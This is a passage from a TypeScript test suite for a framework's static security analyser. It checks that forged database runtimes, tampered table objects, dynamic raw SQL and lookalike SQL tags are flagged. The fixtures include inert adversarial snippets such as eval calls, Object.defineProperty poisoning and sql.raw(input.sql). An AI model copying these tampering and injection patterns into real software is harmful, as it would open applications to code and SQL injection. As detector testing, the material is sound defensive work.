          import { createPostgresAppRuntimeDb } from '@kovojs/server';
          import { appRuntimeDbOptions } from './app-runtime-db-options.js';
          const appDatabase = createPostgresAppRuntimeDb(appRuntimeDbOptions);
          export const appRuntimeWebhookReplayStore = appDatabase.webhookReplayStore;
        `,
      },
      {
        fileName: 'webhooks.ts',
        source: `
          import { publicAccess, s, webhook } from '@kovojs/server';
          import { appRuntimeWebhookReplayStore } from './_kovo/app-runtime-db.js';
          const webhookReplayStore = appRuntimeWebhookReplayStore;
          export const hook = webhook('/webhooks/exact', {
            access: publicAccess('exact generated replay-store fixture'),
            handler() { return { ok: true }; },
            idempotency(input) { return input.id; },
            input: s.object({ id: s.string() }),
            replayStore: webhookReplayStore,
            verify: 'none',
            verifyJustification: 'exact generated replay-store fixture',
          });
        `,
      },
    ];

    // SPEC §10.3: production webhook replay truth must use the generated durable Postgres store.
    expect(sinksForFiles(files)).toEqual([]);

    const exactRuntimeSource = files.find(
      (file) => file.fileName === '_kovo/app-runtime-db.ts',
    )!.source;
    const exactWebhookSource = files.find((file) => file.fileName === 'webhooks.ts')!.source;
    const maliciousReplayStore = `{
      get() { return eval('replay-get'); },
      reserve() { return { abort() {}, commit() {} }; },
      set() {},
    }`;
    const forgedGeneratedExport = files.map((file) =>
      file.fileName === '_kovo/app-runtime-db.ts'
        ? {
            ...file,
            source: exactRuntimeSource.replace(
              'appDatabase.webhookReplayStore',
              maliciousReplayStore,
            ),
          }
        : file,
    );
    const forgedSiblingModule = [
      ...files.map((file) =>
        file.fileName === 'webhooks.ts'
          ? {
              ...file,
              source: exactWebhookSource.replace(
                "'./_kovo/app-runtime-db.js'",
                "'./_kovo/forged-replay.js'",
              ),
            }
          : file,
      ),
      {
        fileName: '_kovo/forged-replay.ts',
        source: `export const appRuntimeWebhookReplayStore = ${maliciousReplayStore};`,
      },
    ];
    const reassignedAlias = files.map((file) =>
      file.fileName === 'webhooks.ts'
        ? {
            ...file,
            source: exactWebhookSource.replace(
              'const webhookReplayStore = appRuntimeWebhookReplayStore;',
              `let webhookReplayStore = appRuntimeWebhookReplayStore;
               webhookReplayStore = ${maliciousReplayStore};`,
            ),
          }
        : file,
    );
    for (const [label, variant] of [
      ['forged generated export', forgedGeneratedExport],
      ['forged sibling module', forgedSiblingModule],
    ] as const) {
      expect(sinksForFiles(variant), label).toEqual(
        expect.arrayContaining([expect.objectContaining({ sink: 'eval' })]),
      );
    }
    expect(sinksForFiles(reassignedAlias)).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          sink: 'request-handler.opaque-source',
          source: '<opaque-retained-config-derivation>',
        }),
      ]),
    );
  });

  it('accepts only the exact declarative SQLite app runtime constructor grammar', () => {
    const source = (constructor: string, options: string, mutation = '') => `
      import { createApp } from '@kovojs/server';
      ${constructor}
      import { sqliteTable, text } from 'drizzle-orm/sqlite-core';
      const contacts = sqliteTable('contacts', { id: text('id').primaryKey() });
      const APP_TABLES = [contacts];
      const APP_SEED = [{ table: contacts, rows: [{ id: 'c1' }] }];
      ${mutation}
      const runtime = createSqliteAppRuntime(${options});
      runtime.systemDb({ operation: 'write', reason: 'auth', surface: 'test' });
      export default createApp({ db: runtime.db, routes: [] });
    `;
    const directImport = `import { createSqliteAppRuntime } from '@kovojs/server/sqlite';`;
    const exactFiles = [
      {
        fileName: 'schema.ts',
        source: `
            import { kovo } from '@kovojs/drizzle';
            import { sqliteTable, text } from 'drizzle-orm/sqlite-core';
            export const contacts = sqliteTable('contacts', { id: text('id').primaryKey() });
            export const contactNotes = sqliteTable(
              'contact_notes',
              { id: text('id').primaryKey(), contactId: text('contact_id').notNull() },
              kovo({
                domain: 'contact-note',
                key: 'id',
                ownerVia: { parent: contacts, fk: 'contactId', parentKey: 'id' },
              }),
            );
          `,
      },
      {
        fileName: '_kovo/app-runtime-db.ts',
        source: `
            ${directImport}
            import { contactNotes, contacts } from '../schema.js';
            const APP_TABLES = [contacts, contactNotes];
            const APP_SEED = [
              { table: contacts, rows: [{ id: 'c1' }] },
              { table: contactNotes, rows: [{ contact_id: 'c1', id: 'n1' }] },
            ];
            const runtime = createSqliteAppRuntime({ seed: APP_SEED, tables: APP_TABLES });
            runtime.systemDb({ operation: 'write', reason: 'auth', surface: 'test' });
            export const appRuntimeDbProvider = runtime.db;
            export const appRuntimeMutationReplayStore = runtime.mutationReplayStore;
          `,
      },
      {
        fileName: 'app.tsx',
        source: `
            import { createApp, createMemoryVersionedClientModuleRegistry } from '@kovojs/server';
            import {
              appRuntimeDbProvider,
              appRuntimeMutationReplayStore,
            } from './_kovo/app-runtime-db.js';
            const clientModules = createMemoryVersionedClientModuleRegistry();
            const mutationReplayStore = appRuntimeMutationReplayStore;
            export default createApp({
              clientModules,
              db: appRuntimeDbProvider,
              mutationReplayStore,
              routes: [],
            });
          `,
      },
      {
        fileName: 'queries.ts',
        source: `
            import { query } from '@kovojs/server';
            import { count, sql as drizzleSql } from 'drizzle-orm';
            import { alias } from 'drizzle-orm/sqlite-core';
            import { contacts } from './schema.js';
            interface AppQueryLoadContext { db?: unknown }
            export const contactsQuery = query({
              async load(_input: unknown, context: AppQueryLoadContext) {
                if (!context.db) throw new Error('missing db');
                const owned = alias(contacts, 'owned_contacts');
                return {
                  items: await context.db
                    .select({
                      id: owned.id,
                      label: drizzleSql<string>\`upper(\${owned.id})\`,
                      total: count(),
                    })
                    .from(owned)
                    .orderBy(owned.id),
                };
              },
            });
          `,
      },
      {
        fileName: 'mutations.ts',
        source: `
            import { mutation } from '@kovojs/server';
            import { contacts } from './schema.js';
            export const addContact = mutation({
              async handler(input, request) {
                await request.db.insert(contacts).values(input);
                return { ok: true };
              },
            });
          `,
      },
    ];
    expect(sinksForFiles(exactFiles)).toEqual([]);

    const exactSchema = exactFiles.find((file) => file.fileName === 'schema.ts')!.source;
    for (const [label, schema] of [
      [
        'local alias',
        exactSchema
          .replace(
            `export const contactNotes = sqliteTable(`,
            `const contactParent = contacts;\nexport const contactNotes = sqliteTable(`,
          )
          .replace(`parent: contacts`, `parent: contactParent`),
      ],
      [
        'mutated parent table',
        `${exactSchema}\nObject.defineProperty(contacts, 'id', { value: { forged: true } });`,
      ],
      [
        'imported lookalike',
        exactSchema
          .replace(
            `import { kovo } from '@kovojs/drizzle';`,
            `import { kovo } from '@kovojs/drizzle';\nimport { contacts as importedParent } from 'forged-schema';`,
          )
          .replace(`parent: contacts`, `parent: importedParent`),
      ],
      ['cyclic parent table', exactSchema.replace(`parent: contacts`, `parent: contactNotes`)],
    ] as const) {
      const variant = exactFiles.map((file) =>
        file.fileName === 'schema.ts' ? { ...file, source: schema } : file,
      );
      const facts = sinksForFiles(variant);
      expect(
        facts.some(
          (fact) =>
            fact.site.startsWith('_kovo/app-runtime-db.ts:') &&
            fact.source === 'createSqliteAppRuntime',
        ),
        label,
      ).toBe(true);
    }

    for (const poison of [
      `
        import { contacts } from './schema.js';
        Object.defineProperty(contacts, 'id', { value: { forged: true } });
      `,
      `
        import { contacts } from './schema.js';
        const escapedTable = contacts;
        Object.defineProperty(escapedTable, 'id', { value: { forged: true } });
      `,
    ]) {
      const crossModuleTablePoison = sinksForFiles([
        ...exactFiles.map((file) =>
          file.fileName === '_kovo/app-runtime-db.ts'
            ? { ...file, source: `import '../poison-table.js';\n${file.source}` }
            : file,
        ),
        { fileName: 'poison-table.ts', source: poison },
      ]);
      expect(crossModuleTablePoison).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            site: expect.stringMatching(/^_kovo\/app-runtime-db\.ts:/u),
            source: 'createSqliteAppRuntime',
          }),
        ]),
      );
    }

    const exactQueries = exactFiles.find((file) => file.fileName === 'queries.ts')!.source;
    for (const [label, queries] of [
      [
        'dynamic alias name',
        exactQueries.replace(
          `alias(contacts, 'owned_contacts')`,
          `alias(contacts, String(_input))`,
        ),
      ],
      [
        'aliased alias constructor',
        exactQueries
          .replace(`import { alias }`, `import { alias as makeAlias }`)
          .replace(`alias(contacts, 'owned_contacts')`, `makeAlias(contacts, 'owned_contacts')`),
      ],
      [
        'mutated alias result',
        exactQueries.replace(
          `const owned = alias(contacts, 'owned_contacts');`,
          `const owned = alias(contacts, 'owned_contacts');\n                Object.defineProperty(owned, 'id', { value: contacts.id });`,
        ),
      ],
      [
        'detached count expression',
        exactQueries.replace(
          `return {`,
          `const detachedCount = count();\n                return { detachedCount,`,
        ),
      ],
      [
        'detached SQL tag',
        exactQueries
          .replace(
            `return {`,
            `const detachedLabel = drizzleSql<string>\`upper(\${owned.id})\`;\n                return {`,
          )
          .replace(`label: drizzleSql<string>\`upper(\${owned.id})\``, `label: detachedLabel`),
      ],
      [
        'escaped SQL carrier',
        exactQueries.replace(
          `const owned = alias(contacts, 'owned_contacts');`,
          `const owned = alias(contacts, 'owned_contacts');\n                const leakedSql = drizzleSql;\n                void leakedSql;`,
        ),
      ],
    ] as const) {
      const facts = sinksForFiles(
        exactFiles.map((file) =>
          file.fileName === 'queries.ts' ? { ...file, source: queries } : file,
        ),
      );
      expect(
        facts.some((fact) => fact.site.startsWith('queries.ts:')),
        `${label}: ${JSON.stringify(facts)}`,
      ).toBe(true);
    }

    for (const [constructor, options, mutation] of [
      [
        `import { createSqliteAppRuntime as make } from '@kovojs/server/sqlite'; const createSqliteAppRuntime = make;`,
        '{ seed: APP_SEED, tables: APP_TABLES }',
        '',
      ],
      [
        `import * as sqlite from '@kovojs/server/sqlite'; const createSqliteAppRuntime = sqlite.createSqliteAppRuntime;`,
        '{ seed: APP_SEED, tables: APP_TABLES }',
        '',
      ],
      [directImport, '{ ...{ seed: APP_SEED }, tables: APP_TABLES }', ''],
      [directImport, `{ ['seed']: APP_SEED, tables: APP_TABLES }`, ''],
      [directImport, '{ seed: APP_SEED, tables: APP_TABLES, extra: true }', ''],
      [directImport, '{ tables: APP_TABLES }', ''],
      [directImport, '{ seed: APP_SEED, tables: makeTables() }', ''],
      [directImport, '{ seed: APP_SEED, tables: APP_TABLES }', `APP_TABLES.push(contacts);`],
      [
        directImport,
        '{ seed: APP_SEED, tables: APP_TABLES }',
        `const escapedTable = contacts; Object.defineProperty(escapedTable, 'id', { value: {} });`,
      ],
      [
        directImport,
        '{ seed: APP_SEED, tables: APP_TABLES }',
        `function poisonTable(table) { Object.defineProperty(table, 'id', { value: {} }); } poisonTable(contacts);`,
      ],
      [
        directImport,
        '{ seed: APP_SEED, tables: APP_TABLES }',
        `const tableBox = { value: contacts }; Object.defineProperty(tableBox.value, 'id', { value: {} });`,
      ],
      [
        directImport,
        '{ seed: APP_SEED, tables: APP_TABLES }',
        `function getTables() { return APP_TABLES; } getTables().push(contacts);`,
      ],
      [
        directImport,
        '{ seed: APP_SEED, tables: APP_TABLES }',
        `function getSeed() { return APP_SEED; } getSeed()[0].rows.push({ id: 'c2' });`,
      ],
      [
        directImport,
        '{ seed: APP_SEED, tables: APP_TABLES }',
        `let escaped; escaped = APP_TABLES; escaped.push(contacts);`,
      ],
      [
        directImport,
        '{ seed: APP_SEED, tables: APP_TABLES }',
        `const holder = {}; holder.value = APP_TABLES; holder.value.push(contacts);`,
      ],
      [
        directImport,
        '{ seed: APP_SEED, tables: APP_TABLES }',
        `class Tables { get value() { return APP_TABLES; } } new Tables().value.push(contacts);`,
      ],
      [
        directImport,
        '{ seed: APP_SEED, tables: APP_TABLES }',
        `function* seeds() { yield APP_SEED; } seeds().next().value[0].rows.push({ id: 'c2' });`,
      ],
      [
        directImport,
        '{ seed: APP_SEED, tables: APP_TABLES }',
        `class StaticHolder { static value = APP_TABLES; } StaticHolder.value[0] = contacts;`,
      ],
      [
        directImport,
        '{ seed: APP_SEED, tables: APP_TABLES }',
        `class Holder { value = APP_SEED; } new Holder().value[0].rows[0] = { id: 'c2' };`,
      ],
      [
        directImport,
        '{ seed: APP_SEED, tables: APP_TABLES }',
        `class Box { constructor(value) { this.value = value; } } new Box(APP_TABLES);`,
      ],
    ] as const) {
      const facts = sinksFor(source(constructor, options, mutation));
      expect(facts.length, `${constructor}\n${options}\n${mutation}`).toBeGreaterThan(0);
      if (
        mutation.includes('getTables') ||
        mutation.includes('getSeed') ||
        mutation.includes('escapedTable') ||
        mutation.includes('poisonTable') ||
        mutation.includes('tableBox') ||
        mutation.includes('escaped') ||
        mutation.includes('holder') ||
        mutation.includes('class Tables') ||
        mutation.includes('function* seeds') ||
        mutation.includes('class StaticHolder') ||
        mutation.includes('class Holder') ||
        mutation.includes('new Box')
      ) {
        expect(facts, mutation).toEqual(
          expect.arrayContaining([
            expect.objectContaining({
              sink: 'request-handler.opaque-call',
              source: 'createSqliteAppRuntime',
            }),
          ]),
        );
      }
    }

    const helperWrappedRuntime = sinksFor(`
      import { execFileSync } from 'node:child_process';
      import { createApp } from '@kovojs/server';
      import { createSqliteAppRuntime } from '@kovojs/server/sqlite';
      import { sqliteTable, text } from 'drizzle-orm/sqlite-core';
      const contacts = sqliteTable('contacts', { id: text('id').primaryKey() });
      const APP_TABLES = [contacts];
      const APP_SEED = [];
      function makeRuntime() {
        execFileSync('runtime-wrapper');
        return createSqliteAppRuntime({ seed: APP_SEED, tables: APP_TABLES });
      }
      export default createApp({
        db: makeRuntime().db,
        routes: [],
      });
    `);
    expect(helperWrappedRuntime).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          sink: 'request-handler.opaque-source',
          source: '<opaque-retained-config-derivation>',
        }),
      ]),
    );
  });

  it('keeps exact generated Better Auth schema carriers inside SQLite runtime table proof', () => {
    const schemaSource = `
      import { sqliteTable, text } from 'drizzle-orm/sqlite-core';
      export const user = sqliteTable('user', { id: text('id').primaryKey() });
      export const session = sqliteTable('session', { id: text('id').primaryKey() });
      export const account = sqliteTable('account', { id: text('id').primaryKey() });
      export const verification = sqliteTable('verification', { id: text('id').primaryKey() });
      export const authSchema = { user, session, account, verification };
    `;
    const files = (schema: string) => [
      { fileName: 'schema.ts', source: schema },
      {
        fileName: '_kovo/app-runtime-db.ts',
        source: `
          import { createBetterAuthSqliteBindingsFromEnvironment } from '@kovojs/better-auth';
          import { createSqliteAppRuntime } from '@kovojs/server/sqlite';
          import { account, authSchema, session, user, verification } from '../schema.js';
          const APP_TABLES = [user, session, account, verification];
          const APP_SEED = [];
          const runtime = createSqliteAppRuntime({ seed: APP_SEED, tables: APP_TABLES });
          createBetterAuthSqliteBindingsFromEnvironment({ schema: authSchema });
          export const appRuntimeDbProvider = runtime.db;
        `,
      },
    ];
    const runtimeConstructorFacts = (schema: string) =>
      sinksForFiles(files(schema)).filter(
        (fact) =>
          fact.site.startsWith('_kovo/app-runtime-db.ts:') &&
          fact.source === 'createSqliteAppRuntime',
      );

    expect(runtimeConstructorFacts(schemaSource)).toEqual([]);
    for (const poison of [
      `Object.defineProperty(authSchema, 'user', { value: {} });`,
      `const escapedAuthSchema = authSchema; Object.defineProperty(escapedAuthSchema, 'user', { value: {} });`,
    ]) {
      expect(runtimeConstructorFacts(`${schemaSource}\n${poison}`), poison).not.toEqual([]);
    }
  });

  it('accepts only exact generated readonly app DB read chains', () => {
    const files = [
      {
        fileName: 'schema.ts',
        source: `
          import { sqliteTable, text } from 'drizzle-orm/sqlite-core';
          export const contacts = sqliteTable('contacts', { id: text('id').primaryKey() });
        `,
      },
      {
        fileName: '_kovo/app-runtime-db.ts',
        source: `
          import { createSqliteAppRuntime } from '@kovojs/server/sqlite';
          import { contacts } from '../schema.js';
          const APP_TABLES = [contacts];
          const APP_SEED = [{ table: contacts, rows: [{ id: 'c1' }] }];
          const appDatabase = createSqliteAppRuntime({ seed: APP_SEED, tables: APP_TABLES });
          export const appRuntimeReadonlyDb = appDatabase.readonlyDb;
        `,
      },
      {
        fileName: 'db.ts',
        source: `
          import { appRuntimeReadonlyDb } from './_kovo/app-runtime-db.js';
          export const readonlyAppDb = appRuntimeReadonlyDb;
        `,
      },
      {
        fileName: 'queries.ts',
        source: `
          import { query } from '@kovojs/server';
          import { readonlyAppDb } from './db.js';
          import { contacts } from './schema.js';
          export const contactCount = query({ async load() {
            const rows = await readonlyAppDb.select({ id: contacts.id }).from(contacts);
            return { total: rows.length };
          } });
        `,
      },
    ];

    expect(sinksForFiles(files)).toEqual([]);
    const unionQuery = `
      import { query } from '@kovojs/server';
      import { readonlyAppDb } from './db.js';
      import { contacts } from './schema.js';
      export const contactCount = query({ async load() {
        const rows = await readonlyAppDb
          .select({ id: contacts.id })
          .from(contacts)
          .union(readonlyAppDb.select({ id: contacts.id }).from(contacts));
        return { total: rows.length };
      } });
    `;
    expect(
      sinksForFiles(
        files.map((file) =>
          file.fileName === 'queries.ts' ? { ...file, source: unionQuery } : file,
        ),
      ),
    ).toEqual([]);
    const computedUnionFacts = sinksForFiles(
      files.map((file) =>
        file.fileName === 'queries.ts'
          ? { ...file, source: unionQuery.replace('.union(', "['union'](") }
          : file,
      ),
    );
    expect(
      computedUnionFacts.some(
        (fact) => fact.site.startsWith('queries.ts:') && fact.sink.startsWith('request-handler.'),
      ),
      JSON.stringify(computedUnionFacts),
    ).toBe(true);
    const mappedRowsQuery = `
      import { query } from '@kovojs/server';
      import { readonlyAppDb } from './db.js';
      import { contacts } from './schema.js';
      export const contactCount = query({ async load() {
        const rows = await readonlyAppDb.select({ id: contacts.id }).from(contacts);
        return { items: rows.map((row) => ({ id: row.id.toUpperCase() })) };
      } });
    `;
    expect(
      sinksForFiles(
        files.map((file) =>
          file.fileName === 'queries.ts' ? { ...file, source: mappedRowsQuery } : file,
        ),
      ),
    ).toEqual([]);

    const rawReadQuery = `
      import { sql, trustedSql } from '@kovojs/drizzle';
      import { query } from '@kovojs/server';
      import { readonlyAppDb } from './db.js';
      export const contactCount = query({ async load() {
        const rows = await readonlyAppDb.rawRead<{ id: string }>(
          trustedSql(sql.raw<{ id: string }>('select id from contacts'), {
            justification: 'reviewed static contacts read',
          }),
          { reads: ['contacts'] },
        );
        return { total: rows.length };
      } });
    `;
    const rawReadFiles = files.map((file) =>
      file.fileName === 'queries.ts' ? { ...file, source: rawReadQuery } : file,
    );
    expect(sinksForFiles(rawReadFiles)).toEqual([]);
    const rawReadEndpoint = `
      import { sql, trustedSql } from '@kovojs/drizzle';
      import { endpoint, publicAccess } from '@kovojs/server';
      import { readonlyAppDb } from './db.js';
      const rawReadPublic = publicAccess('reviewed public rawRead fixture');
      export const contactsEndpoint = endpoint('/api/contacts', {
        access: rawReadPublic,
        auth: { justification: 'public read-only fixture', kind: 'none' },
        csrf: false,
        csrfJustification: 'read-only endpoint fixture',
        async handler() {
          const rows = await readonlyAppDb.rawRead<{ id: string }>(
            trustedSql(sql.raw<{ id: string }>('select id from contacts'), {
              justification: 'reviewed static contacts read',
            }),
            { reads: ['contacts'] },
          );
          return Response.json({ rows }, { headers: { 'Cache-Control': 'no-store' } });
        },
        method: 'GET',
        reason: 'read-only contacts fixture',
        response: { appOwnedSafety: true, body: 'json', cache: 'no-store' },
      });
    `;
    const registeredRawReadEndpointFiles = [
      ...files.map((file) => {
        if (file.fileName === 'queries.ts') return { ...file, source: rawReadEndpoint };
        if (file.fileName !== '_kovo/app-runtime-db.ts') return file;
        return {
          ...file,
          source: file.source.replace(
            'export const appRuntimeReadonlyDb = appDatabase.readonlyDb;',
            `export const appRuntimeDbProvider = appDatabase.db;
             export const appRuntimeReadonlyDb = appDatabase.readonlyDb;`,
          ),
        };
      }),
      {
        fileName: 'app.ts',
        source: `
          import { createApp } from '@kovojs/server';
          import { appRuntimeDbProvider } from './_kovo/app-runtime-db.js';
          import { contactsEndpoint } from './queries.js';
          export default createApp({
            db: appRuntimeDbProvider,
            endpoints: [contactsEndpoint],
            routes: [],
          });
        `,
      },
    ];
    expect(sinksForFiles(registeredRawReadEndpointFiles)).toEqual([]);
    expect(
      sinksForFiles([
        ...rawReadFiles,
        {
          fileName: 'app.tsx',
          source: `
            import { createApp } from '@kovojs/server';
            import { contactCount } from './queries.js';
            export default createApp({ queries: [contactCount], routes: [] });
          `,
        },
      ]),
    ).toEqual([]);
    const dormantTest = {
      fileName: 'app.test.ts',
      source: `
        import { readonlyAppDb } from './db.js';
        const testOnlyDbValues = [readonlyAppDb];
        void testOnlyDbValues;
      `,
    };
    expect(sinksForFiles([...rawReadFiles, dormantTest])).toEqual([]);
    const importedTestFacts = sinksForFiles([
      ...rawReadFiles.map((file) =>
        file.fileName === 'queries.ts'
          ? { ...file, source: `import './app.test.js';\n${file.source}` }
          : file,
      ),
      dormantTest,
    ]);
    expect(
      importedTestFacts.some(
        (fact) => fact.site.startsWith('queries.ts:') && fact.sink.startsWith('request-handler.'),
      ),
      JSON.stringify(importedTestFacts),
    ).toBe(true);

    for (const [label, source] of [
      [
        'computed rawRead method',
        rawReadQuery.replace('readonlyAppDb.rawRead', "readonlyAppDb['rawRead']"),
      ],
      [
        'aliased rawRead method',
        rawReadQuery.replace(
          'const rows = await readonlyAppDb.rawRead',
          'const rawRead = readonlyAppDb.rawRead;\n        const rows = await rawRead',
        ),
      ],
      [
        'dynamic read table',
        rawReadQuery
          .replace('async load()', 'async load(input)')
          .replace("{ reads: ['contacts'] }", '{ reads: [input.table] }'),
      ],
      [
        'spread read declaration',
        rawReadQuery.replace("{ reads: ['contacts'] }", "{ ...{ reads: ['contacts'] } }"),
      ],
      [
        'extra read option',
        rawReadQuery.replace(
          "{ reads: ['contacts'] }",
          "{ reads: ['contacts'], reason: 'forged' }",
        ),
      ],
      [
        'dynamic raw SQL',
        rawReadQuery
          .replace('async load()', 'async load(input)')
          .replace("sql.raw<{ id: string }>('select id from contacts')", 'sql.raw(input.sql)'),
      ],
    ] as const) {
      const facts = sinksForFiles(
        rawReadFiles.map((file) => (file.fileName === 'queries.ts' ? { ...file, source } : file)),
      );
      expect(
        facts.some(
          (fact) =>
            fact.site.startsWith('queries.ts:') &&
            (fact.sink === 'request-handler.opaque-call' ||
              fact.sink === 'request-handler.opaque-protocol' ||
              fact.sink === 'request-handler.opaque-source'),
        ),
        `${label}: ${JSON.stringify(facts)}`,
      ).toBe(true);
    }

    for (const poison of [
      `
        import { readonlyAppDb } from './db.js';
        Object.defineProperty(readonlyAppDb, 'select', { value: () => ({}) });
      `,
      `
        import { readonlyAppDb as importedDb } from './db.js';
        const escapedReadonlyDb = importedDb;
        Object.defineProperty(escapedReadonlyDb, 'select', { value: () => ({}) });
      `,
    ]) {
      const crossModuleReadonlyPoison = sinksForFiles([
        ...files.map((file) =>
          file.fileName === 'queries.ts'
            ? { ...file, source: `import './poison-readonly.js';\n${file.source}` }
            : file,
        ),
        { fileName: 'poison-readonly.ts', source: poison },
      ]);
      expect(
        crossModuleReadonlyPoison.some(
          (fact) =>
            fact.site.startsWith('queries.ts:') &&
            (fact.sink === 'request-handler.opaque-call' ||
              fact.sink === 'request-handler.opaque-protocol' ||
              fact.sink === 'request-handler.opaque-source'),
        ),
        JSON.stringify(crossModuleReadonlyPoison),
      ).toBe(true);
    }

    const exactQuery = files.find((file) => file.fileName === 'queries.ts')!.source;
    const exactDb = files.find((file) => file.fileName === 'db.ts')!.source;
    const exactRuntime = files.find((file) => file.fileName === '_kovo/app-runtime-db.ts')!.source;
    const queryVariants = [
      [
        'local alias',
        exactQuery.replace(
          'const rows = await readonlyAppDb',
          'const db = readonlyAppDb;\n            const rows = await db',
        ),
      ],
      [
        'proxy alias',
        exactQuery.replace(
          'const rows = await readonlyAppDb',
          'const db = new Proxy(readonlyAppDb, {});\n            const rows = await db',
        ),
      ],
      [
        'computed read method',
        exactQuery.replace('readonlyAppDb.select', "readonlyAppDb['select']"),
      ],
      [
        'call adapter',
        exactQuery.replace(
          'readonlyAppDb.select({ id: contacts.id })',
          'readonlyAppDb.select.call(readonlyAppDb, { id: contacts.id })',
        ),
      ],
      [
        'write method',
        exactQuery.replace(
          'const rows = await readonlyAppDb.select({ id: contacts.id }).from(contacts);',
          "await readonlyAppDb.insert(contacts).values({ id: 'c2' }); const rows: unknown[] = [];",
        ),
      ],
    ] as const;
    for (const [label, querySource] of queryVariants) {
      const facts = sinksForFiles(
        files.map((file) =>
          file.fileName === 'queries.ts' ? { ...file, source: querySource } : file,
        ),
      );
      expect(
        facts.some(
          (fact) =>
            fact.site.startsWith('queries.ts:') &&
            (fact.sink === 'request-handler.opaque-call' ||
              fact.sink === 'request-handler.opaque-protocol' ||
              fact.sink === 'request-handler.opaque-source'),
        ),
        `${label}: ${JSON.stringify(facts)}`,
      ).toBe(true);
    }

    for (const [label, fileName, source] of [
      [
        'replaced read method',
        'db.ts',
        `${exactDb}\nObject.defineProperty(readonlyAppDb, 'select', { value: () => ({}) });`,
      ],
      [
        'forged generated runtime export',
        '_kovo/app-runtime-db.ts',
        exactRuntime.replace(
          'appDatabase.readonlyDb',
          `{ select() { return { from() { eval('forged'); } }; } }`,
        ),
      ],
    ] as const) {
      const facts = sinksForFiles(
        files.map((file) => (file.fileName === fileName ? { ...file, source } : file)),
      );
      expect(
        facts.some(
          (fact) =>
            fact.site.startsWith('queries.ts:') &&
            (fact.sink === 'request-handler.opaque-call' ||
              fact.sink === 'request-handler.opaque-protocol' ||
              fact.sink === 'request-handler.opaque-source'),
        ),
        `${label}: ${JSON.stringify(facts)}`,
      ).toBe(true);
    }
  });

  it('keeps Drizzle table-pristine verdicts fail-closed across shared-root scan order', () => {
    const schema = {
      fileName: 'schema.ts',
      source: `
        import { sqliteTable, text } from 'drizzle-orm/sqlite-core';
        export const contacts = sqliteTable('contacts', { id: text('id').primaryKey() });
      `,
    };
    const sharedSource = (registrations: string) => `
      import { endpoint, query } from '@kovojs/server';
      import { contacts } from './schema.js';
      async function shared(first: any, db: any) {
        const dormant = () => first.db.select({ id: contacts.id }).from(contacts);
        void dormant;
        return await db.select({ id: contacts.id }).from(contacts);
      }
      ${registrations}
    `;
    const endpoint = `export const endpointRoot = endpoint('/shared', { handler: shared });`;
    const query = `export const queryRoot = query({ load: shared });`;
    const tableFacts = (registrations: string) =>
      sinksForFiles([schema, { fileName: 'shared.ts', source: sharedSource(registrations) }])
        .filter(
          (fact) =>
            fact.site.startsWith('shared.ts:') &&
            fact.sink === 'request-handler.opaque-protocol' &&
            fact.source === '<property-getter:contacts>',
        )
        .map((fact) => `${fact.site}|${fact.sink}|${fact.source}`)
        .sort();

    const endpointFirst = tableFacts(`${endpoint}\n${query}`);
    const queryFirst = tableFacts(`${query}\n${endpoint}`);
    expect(endpointFirst.length).toBeGreaterThan(0);
    expect(queryFirst).toEqual(endpointFirst);
  });

  it('accepts exact pristine literal-only staticSql tags on reviewed DB SQL paths', () => {
    const facts = sinksFor(`
      import { staticSql, staticSql as literalSql } from '@kovojs/drizzle';
      import * as drizzle from '@kovojs/drizzle';
      import { mutation } from '@kovojs/server';
      export const write = mutation({ async handler(_input, request) {
        await request.db.execute(staticSql\`select 1\`);
        await request.db.run(literalSql\`select 2\`);
        await request.db.prepare(drizzle.staticSql\`select 3\`);
        return { ok: true };
      } });
    `);

    expect(facts).toEqual([]);
  });

  it('keeps non-exact, mutable, copied, wrapped, computed, and interpolated staticSql tags closed', () => {
    const sources = [
      [
        'interpolated template',
        `
          import { staticSql } from '@kovojs/drizzle';
          import { mutation } from '@kovojs/server';
          export const write = mutation({ async handler(input, request) {
            await request.db.execute(staticSql\`select \${input.id}\`);
            return { ok: true };
          } });
        `,
      ],
      [
        'copied tag',
        `
          import { staticSql } from '@kovojs/drizzle';
          import { mutation } from '@kovojs/server';
          const copied = staticSql;
          export const write = mutation({ async handler(_input, request) {
            await request.db.execute(copied\`select 1\`);
            return { ok: true };
          } });
        `,
      ],
      [
        'detached namespace tag',
        `
          import * as drizzle from '@kovojs/drizzle';
          import { mutation } from '@kovojs/server';
          const copied = drizzle.staticSql;
          export const write = mutation({ async handler(_input, request) {
            await request.db.execute(copied\`select 1\`);
            return { ok: true };
          } });
        `,
      ],
      [
        'wrapper tag',
        `
          import { staticSql } from '@kovojs/drizzle';
          import { mutation } from '@kovojs/server';
          const wrapped = (strings: TemplateStringsArray) => staticSql(strings);
          export const write = mutation({ async handler(_input, request) {
            await request.db.execute(wrapped\`select 1\`);
            return { ok: true };
          } });
        `,
      ],
      [
        'literal computed namespace member',
        `
          import * as drizzle from '@kovojs/drizzle';
          import { mutation } from '@kovojs/server';
          export const write = mutation({ async handler(_input, request) {
            await request.db.execute(drizzle['staticSql']\`select 1\`);
            return { ok: true };
          } });
        `,
      ],
      [
        'dynamic computed namespace member',
        `
          import * as drizzle from '@kovojs/drizzle';
          import { mutation } from '@kovojs/server';
          const member = 'staticSql';
          export const write = mutation({ async handler(_input, request) {
            await request.db.execute(drizzle[member]\`select 1\`);
            return { ok: true };
          } });
        `,
      ],
      [
        'reassigned named-import alias',
        `
          import { staticSql } from '@kovojs/drizzle';
          import { mutation } from '@kovojs/server';
          const forged = (strings: TemplateStringsArray) => {
            eval('mutable tag');
            return strings;
          };
          let mutable = staticSql;
          mutable = forged;
          export const write = mutation({ async handler(_input, request) {
            await request.db.execute(mutable\`select 1\`);
            return { ok: true };
          } });
        `,
      ],
      [
        'reassigned namespace member',
        `
          import * as drizzle from '@kovojs/drizzle';
          import { mutation } from '@kovojs/server';
          const forged = (strings: TemplateStringsArray) => {
            eval('namespace tag');
            return strings;
          };
          (drizzle as { staticSql: typeof forged }).staticSql = forged;
          export const write = mutation({ async handler(_input, request) {
            await request.db.execute(drizzle.staticSql\`select 1\`);
            return { ok: true };
          } });
        `,
      ],
      [
        'local lookalike',
        `
          import { mutation } from '@kovojs/server';
          const staticSql = (strings: TemplateStringsArray) => {
            eval('local tag');
            return strings;
          };
          export const write = mutation({ async handler(_input, request) {
            await request.db.execute(staticSql\`select 1\`);
            return { ok: true };
          } });
        `,
      ],
    ] as const;

    for (const [label, source] of sources) {
      const facts = sinksFor(source);
      expect(
